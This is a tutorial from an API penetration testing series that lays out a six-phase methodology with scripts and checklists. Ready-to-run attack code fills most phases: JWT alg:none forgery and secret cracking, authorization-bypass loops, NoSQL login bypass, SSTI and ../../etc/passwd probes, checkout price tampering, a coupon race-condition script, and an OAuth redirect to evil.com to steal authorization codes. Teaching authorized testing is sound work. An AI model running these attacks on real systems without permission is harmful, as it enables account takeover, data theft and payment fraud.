# The Complete API Pentesting Methodology: 6 Phases from Recon to Report

> **Series:** 30-Day API Pentesting | **Day 25** | Week 4: Advanced Attacks  
> **Difficulty:** All levels  
> **Topic:** Full API Pentesting Methodology — The Complete Playbook

---

## Why You Need a Methodology

Random testing wastes time and misses bugs. Experienced hunters don't "just try things" — they run the same systematic playbook on every target, adapting to what they find. The playbook ensures you never skip a phase, never forget a check, and never leave bugs on the table.

This document is the distillation of everything from Days 1–24 into one executable playbook.

---

## The 6-Phase API Pentesting Playbook

```
Phase 1: Recon & Surface Mapping      ← find everything first
Phase 2: Authentication Testing       ← can you bypass the front door?
Phase 3: Authorization Testing        ← can you access what isn't yours?
Phase 4: Input Validation Testing     ← does the server trust your data?
Phase 5: Business Logic & Race Cond.  ← does the flow make sense?
Phase 6: Infrastructure & Headers     ← what does the server reveal?
```

Each phase has specific tools, techniques, and a completion gate. Don't move to the next phase until the current one is done.

---

## Phase 1: Recon & Surface Mapping

**Goal:** Build a complete map of every API endpoint, parameter, and authentication mechanism before sending a single attack payload.

**Rule:** The more complete your map, the more bugs you find. Lazy recon = missed bugs.

### 1.1 Find API Documentation

```bash
# These paths expose full API schemas — check all of them
SWAGGER_PATHS=(
    "/swagger.json" "/swagger.yaml"
    "/api-docs" "/api-docs.json"
    "/openapi.json" "/openapi.yaml"
    "/v1/api-docs" "/v2/api-docs" "/v3/api-docs"
    "/.well-known/openapi"
    "/api/swagger" "/api/swagger.json"
)
for path in "${SWAGGER_PATHS[@]}"; do
    CODE=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$path")
    [ "$CODE" = "200" ] && echo "FOUND: $path"
done
```

### 1.2 Mine JavaScript for Hidden Endpoints

```bash
# Get all JS files from the app
curl -s https://target.com | grep -oE 'src="[^"]*\.js"' | cut -d'"' -f2

# For each JS file, extract API paths
for js_url in $(curl -s https://target.com | grep -oE '"https?://[^"]*\.js"' | tr -d '"'); do
    curl -s "$js_url" | grep -oE '"/api/[a-zA-Z0-9/{}_.-]+"' | sort -u
done

# Single-line version
curl -s https://target.com/app.bundle.js | \
    grep -oE '"(/api/[^"]+)"' | tr -d '"' | sort -u > js_endpoints.txt
cat js_endpoints.txt
```

### 1.3 Brute Force Endpoint Discovery

```bash
# Run ffuf on all common API paths
ffuf -u https://target.com/api/FUZZ \
    -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt \
    -mc 200,201,301,401,403 \
    -fc 404 \
    -t 50 \
    -o recon_endpoints.json -of json

# API version discovery
ffuf -u https://target.com/api/FUZZ/users \
    -w <(echo -e "v1\nv2\nv3\nv4\nbeta\nalpha\ndev\nstaging") \
    -mc 200,401,403 -t 20
```

### 1.4 Capture All Traffic in Burp

```bash
# Most important recon step:
# 1. Open Burp, set proxy
# 2. Browse EVERY feature of the app as an authenticated user
# 3. Read HTTP History — you now have every API call the app makes
# 4. Use Logger++ extension to capture everything
```

### Phase 1 Completion Gate ✓
```
☐ Swagger/OpenAPI spec found and downloaded (or confirmed absent)
☐ JS files grep'd for endpoint paths
☐ ffuf endpoint discovery run on /api/FUZZ
☐ API versions checked (v1, v2, beta, etc.)
☐ Burp capturing traffic while browsing all features
☐ All endpoints mapped in a list
```

---

## Phase 2: Authentication Testing

**Goal:** Verify that the authentication mechanism cannot be bypassed, forged, or stolen.

**Rule:** Test auth systematically. Every mechanism has a known weakness.

### 2.1 JWT Testing

```bash
# Step 1: Identify JWT usage
# Look for: Authorization: Bearer eyJhbGc...

# Step 2: Decode and read the token
TOKEN="YOUR_JWT_HERE"
echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Step 3: Try alg:none bypass
python3 -c "
import base64, json
parts = '$TOKEN'.split('.')
payload = json.loads(base64.urlsafe_b64decode(parts[1]+'=='))
payload['role'] = 'admin'
new_h = base64.urlsafe_b64encode(b'{\"alg\":\"none\",\"typ\":\"JWT\"}').rstrip(b'=').decode()
new_p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
print(f'{new_h}.{new_p}.')
"

# Step 4: Brute force weak secret
echo "$TOKEN" > jwt.txt
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Step 5: Check /jwks.json for RS256→HS256 confusion
curl https://target.com/.well-known/jwks.json
curl https://target.com/jwks.json
```

### 2.2 OAuth Testing

```bash
# Intercept the authorization URL in Burp, then test:

# Test 1: Open redirect
# Change: redirect_uri=https://target.com/callback
# To:     redirect_uri=https://evil.com
# Does provider redirect to evil.com? → auth code stolen → ATO

# Test 2: Missing/static state
# Check if state parameter is present and changes each request
# Try: call /callback with different state value → still works? → CSRF

# Test 3: Scope escalation
# Original: scope=email
# Modified: scope=email+admin+write:all
```

### 2.3 Token Replay

```bash
# After logout, replay the old token
# If 200 OK → no token revocation → High bug

TOKEN=$(curl -s -X POST https://target.com/api/login \
    -d '{"email":"test@test.com","password":"Test1234"}' \
    | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Logout
curl -X POST https://target.com/api/logout \
    -H "Authorization: Bearer $TOKEN"

# Replay
CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    https://target.com/api/profile \
    -H "Authorization: Bearer $TOKEN")
[ "$CODE" = "200" ] && echo "VULN: Token still valid after logout!"
```

### Phase 2 Completion Gate ✓
```
☐ JWT alg:none tested
☐ JWT secret brute forced with hashcat
☐ /jwks.json checked → RS256→HS256 tested if public key found
☐ OAuth redirect_uri tested with evil.com + encoding variations
☐ OAuth state parameter checked for presence and validation
☐ Token replay after logout tested
☐ 2FA bypass attempted (if 2FA present)
```

---

## Phase 3: Authorization Testing

**Goal:** Verify that each user can only access their own data and appropriate functionality.

**Rule:** Two accounts. Every endpoint. Every HTTP method. Autorize runs automatically.

### 3.1 BOLA (Broken Object Level Authorization)

```bash
# Setup: Account A (attacker, id:1002) + Account B (victim, id:1001)
TOKEN_A="YOUR_TOKEN_A"

# Test all ID-containing URLs found in Phase 1
ENDPOINTS=(
    "/api/users/1001"
    "/api/orders/ORDER-B-123"
    "/api/invoices/INV-B-456"
    "/api/documents/DOC-B-789"
)
for endpoint in "${ENDPOINTS[@]}"; do
    CODE=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "Authorization: Bearer $TOKEN_A" \
        "https://target.com$endpoint")
    [ "$CODE" = "200" ] && echo "BOLA: $endpoint returned 200 with TOKEN_A!"
done
```

### 3.2 BFLA (Broken Function Level Authorization)

```bash
# Find admin endpoints from Phase 1 Swagger/JS mining
TOKEN_USER="YOUR_REGULAR_USER_TOKEN"

ADMIN_ENDPOINTS=(
    "/api/admin/users"
    "/api/admin/export"
    "/api/admin/config"
    "/api/admin/logs"
)
for endpoint in "${ADMIN_ENDPOINTS[@]}"; do
    for method in GET POST PUT DELETE; do
        CODE=$(curl -s -o /dev/null -w "%{http_code}" \
            -X $method \
            -H "Authorization: Bearer $TOKEN_USER" \
            "https://target.com$endpoint")
        [ "$CODE" = "200" ] && echo "BFLA: $method $endpoint = 200 with USER token!"
    done
done
```

### 3.3 Mass Assignment

```bash
# GET your profile → note ALL fields
# Then POST/PUT those fields to see which ones the server accepts
curl -H "Authorization: Bearer TOKEN" https://target.com/api/me | python3 -m json.tool

# Test registration with privilege escalation fields
curl -X POST https://target.com/api/register \
    -H "Content-Type: application/json" \
    -d '{
        "email": "test@test.com",
        "password": "Test1234!",
        "role": "admin",
        "is_admin": true,
        "verified": true,
        "credits": 99999
    }'
```

### Phase 3 Completion Gate ✓
```
☐ Autorize set up with low-privilege token, all features browsed as admin
☐ All ID-containing endpoints tested with wrong account's IDs
☐ All HTTP methods tested on each endpoint (not just GET)
☐ All admin endpoints tested with regular user token
☐ Mass assignment tested on register + profile update endpoints
☐ All fields from GET response injected into POST body
```

---

## Phase 4: Input Validation Testing

**Goal:** Test every user-supplied input for injection vulnerabilities.

**Rule:** Every string field is a suspect. Test systematically, not randomly.

### 4.1 SQL Injection

```bash
# Add ' to every string parameter and check for errors
ENDPOINTS=("/api/search" "/api/users" "/api/products" "/api/login")
PARAMS=("query" "name" "id" "email" "filter")

for endpoint in "${ENDPOINTS[@]}"; do
    for param in "${PARAMS[@]}"; do
        resp=$(curl -s -X POST "https://target.com$endpoint" \
            -H "Authorization: Bearer TOKEN" \
            -H "Content-Type: application/json" \
            -d "{\"$param\":\"x'\"}")
        if echo "$resp" | grep -qiE "sql|syntax|error|ORA-|mysql|postgres"; then
            echo "SQLi candidate: $endpoint ($param)"
        fi
    done
done
```

### 4.2 NoSQL Injection

```bash
# MongoDB operator injection in JSON body
curl -X POST https://target.com/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":{"$gt":""},"password":{"$gt":""}}'
# If 200 + token returned → NoSQL auth bypass!

# Also try:
curl -X GET "https://target.com/api/users?role[\$ne]=user"  # returns non-user accounts
```

### 4.3 SSTI Detection

```bash
# Test {{7*7}} in every string field
# If response contains "49" → SSTI confirmed

for field in "name" "bio" "description" "title" "message" "template"; do
    resp=$(curl -s -X PUT https://target.com/api/profile \
        -H "Authorization: Bearer TOKEN" \
        -H "Content-Type: application/json" \
        -d "{\"$field\":\"{{7*7}}\"}")
    echo "$resp" | grep -q "49" && echo "SSTI in field: $field!"
done
```

### Phase 4 Completion Gate ✓
```
☐ Single quote ' tested in every string parameter
☐ NoSQL operators {$gt:""} tested on login + filter endpoints
☐ {{7*7}} tested in every string field via Burp Repeater
☐ Path traversal ../../etc/passwd tested in file/path params
☐ XXE tested on XML-accepting endpoints
☐ Burp Scanner run on key POST endpoints
```

---

## Phase 5: Business Logic & Race Conditions

**Goal:** Break the expected flow. Find what happens when you use the API in ways the developer didn't design for.

**Rule:** Think like a confused, adversarial user. What can you skip? Repeat? Reverse?

### 5.1 Business Logic Checks

```bash
# Price manipulation
curl -X POST https://target.com/api/checkout \
    -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" \
    -d '{"items":[{"productId":"PROD-1","quantity":1,"unitPrice":0.01}],"total":0.01}'

# Workflow bypass — skip payment
ORDER_ID="ORDER-123"
curl -X POST "https://target.com/api/orders/$ORDER_ID/confirm" \
    -H "Authorization: Bearer TOKEN"  # without completing payment

# Negative quantity
curl -X POST https://target.com/api/cart/add \
    -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" \
    -d '{"productId":"PROD-1","quantity":-1}'
```

### 5.2 Race Conditions

```python
import requests, threading

TARGET  = "https://target.com"
HEADERS = {"Authorization": "Bearer TOKEN", "Content-Type": "application/json"}
results = []
lock = threading.Lock()
barrier = threading.Barrier(50)

def race_request():
    barrier.wait()  # all 50 release simultaneously
    r = requests.post(f"{TARGET}/api/coupon/apply",
                      headers=HEADERS, json={"code": "SINGLE-USE-CODE"})
    with lock: results.append(r.status_code)

threads = [threading.Thread(target=race_request) for _ in range(50)]
for t in threads: t.start()
for t in threads: t.join()
print(f"Successes: {results.count(200)} / 50")
```

### Phase 5 Completion Gate ✓
```
☐ Price fields modified (0.01, -1, 0) on checkout endpoints
☐ Multi-step flows tested with steps skipped or reversed
☐ Coupon/promo codes tested with concurrent requests
☐ Balance transfer tested with self-transfer (from == to)
☐ Status fields (delivered, paid, approved) manipulated directly
☐ Race condition tested on single-use resources
```

---

## Phase 6: Infrastructure & Headers

**Goal:** Identify information leakage, misconfigured headers, and infrastructure-level findings.

### 6.1 Security Headers Audit

```bash
# Run this on every target — 2 minutes, multiple potential findings
TARGET="https://target.com"
TOKEN="Bearer YOUR_TOKEN"

echo "=== CORS Check ==="
curl -s -I "$TARGET/api/v1/user" \
    -H "Origin: https://evil.com" \
    -H "Authorization: $TOKEN" | grep -i "access-control"

echo "=== Must-Have Headers ==="
HEADERS=$(curl -s -I "$TARGET")
for h in "content-security-policy" "x-frame-options" "strict-transport-security"; do
    echo "$HEADERS" | grep -qi "$h" \
        && echo "PRESENT: $h" || echo "MISSING: $h <-- FINDING"
done

echo "=== Version Disclosure ==="
curl -s -I "$TARGET" | grep -iE "server:|x-powered-by:" | head -5
```

### 6.2 GraphQL Checks

```bash
# Run introspection query if GraphQL endpoint found
curl -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -d '{"query":"{__schema{types{name fields{name}}}}"}' \
    | python3 -m json.tool | grep -E '"name"' | head -30

# Run graphql-cop
pip install graphql-cop
graphql-cop -t https://target.com/graphql -H "Authorization: Bearer TOKEN"
```

### Phase 6 Completion Gate ✓
```
☐ CORS origin reflection tested
☐ All response headers checked (must-have and must-not-have)
☐ Server version disclosure checked and CVEs looked up
☐ GraphQL introspection attempted
☐ WebSocket endpoints found and tested
☐ Error messages triggered and read (verbose errors?)
```

---

## The Master Checklist — Print and Run on Every Target

```
=== PHASE 1: RECON ===
☐  Swagger/OpenAPI found at /swagger.json /api-docs /openapi.yaml
☐  JS files grep'd: grep -oE '"/api/[^"]+"' *.js | sort -u
☐  ffuf endpoint discovery: ffuf -u target/api/FUZZ -w api.txt -mc 200,401,403
☐  API versions tested: v1, v2, v3, beta, alpha, dev, staging
☐  Burp capturing all traffic while browsing as authenticated user

=== PHASE 2: AUTH ===
☐  JWT decoded, alg:none bypass attempted
☐  JWT secret brute forced: hashcat -m 16500 jwt.txt rockyou.txt
☐  /jwks.json checked → RS256→HS256 tested
☐  OAuth redirect_uri tested: evil.com + encoding variations
☐  OAuth state parameter validated?
☐  Token replay after logout tested

=== PHASE 3: AUTHZ ===
☐  Two accounts created (attacker + victim)
☐  BOLA: all ID-containing endpoints tested with wrong account's IDs
☐  BFLA: all admin endpoints tested with regular user token
☐  HTTP methods: GET/POST/PUT/PATCH/DELETE tested on each endpoint
☐  Mass assignment: all GET response fields injected into POST body
☐  Autorize extension running while browsing

=== PHASE 4: INJECTION ===
☐  SQLi: ' added to every string parameter
☐  NoSQLi: {$gt:""} in JSON bodies, ?field[$ne]=null in query params
☐  SSTI: {{7*7}} in every string field
☐  Path traversal: ../../etc/passwd in file/path parameters
☐  Burp Scanner run on all POST endpoints

=== PHASE 5: LOGIC ===
☐  Price: {price:0.01} {quantity:-1} {total:0} tested on checkout
☐  Workflow: each step skipped, each step repeated
☐  Coupons: same code applied multiple times concurrently
☐  Transfers: self-transfer (from == to), negative amounts
☐  Status: PUT {status:delivered/approved/paid} on own objects
☐  Race: 50 concurrent requests on single-use resources

=== PHASE 6: INFRA ===
☐  CORS: OPTIONS -H "Origin: evil.com" → ACAO checked
☐  Headers: CSP, X-Frame-Options, HSTS presence confirmed
☐  Version: Server header → CVE lookup
☐  GraphQL: introspection, batching, injection tested
☐  WebSocket: found, CSWSH tested, injection tested
```

---

## Time Allocation Guide

```
For a 1-day engagement:
  Phase 1 (Recon):      90 minutes
  Phase 2 (Auth):       60 minutes
  Phase 3 (Authz):      90 minutes   ← most bugs found here
  Phase 4 (Injection):  60 minutes
  Phase 5 (Logic):      45 minutes
  Phase 6 (Infra):      30 minutes
  Documentation:        45 minutes

For bug bounty (unlimited time):
  Phase 1:  2-4 hours (thorough recon = more bugs)
  Phase 2:  1-2 hours
  Phase 3:  4-8 hours (Autorize running while you manually test)
  Phase 4:  2-3 hours
  Phase 5:  2-4 hours (most creative, most rewarding)
  Phase 6:  30 minutes
```

---

*Written by @anand87794*  
*30-Day API Pentesting Series — Day 25 of 30*
